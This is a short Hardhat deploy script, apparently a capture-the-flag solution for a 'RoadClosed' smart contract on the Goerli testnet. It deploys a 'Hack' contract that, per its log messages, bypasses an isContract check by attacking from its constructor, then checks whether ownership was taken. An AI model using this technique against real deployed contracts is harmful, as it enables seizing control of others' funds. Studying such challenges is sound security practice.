const { ethers } = require("hardhat");
require("dotenv").config();
async function main() {
  let target = "0xD2372EB76C559586bE0745914e9538C17878E812"; //Goerli Test Net

  const provider = new ethers.providers.JsonRpcProvider(process.env.PROVIDER);

  const RoadClosed = await ethers.getContractFactory("RoadClosed");
  const Hack = await ethers.getContractFactory("Hack");
  console.log("Deploying Hack Contract..");

  const hack = await Hack.deploy(target);
  await hack.deployed();
  console.log(
    `Deployed Hack and Bypassed isContract check and Executed attack in contructor at ${hack.address}`
  );

  const roadClosed = new ethers.Contract(
    target,
    RoadClosed.interface,
    provider
  );

  const isOwner = await hack.isOwner();
  const isHacked = await roadClosed.isHacked();
  console.log(isOwner, isHacked);
  if (isHacked == true && isOwner == true) {
    console.log("Attack Successfull");
  } else {
    console.log("Error");
  }
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
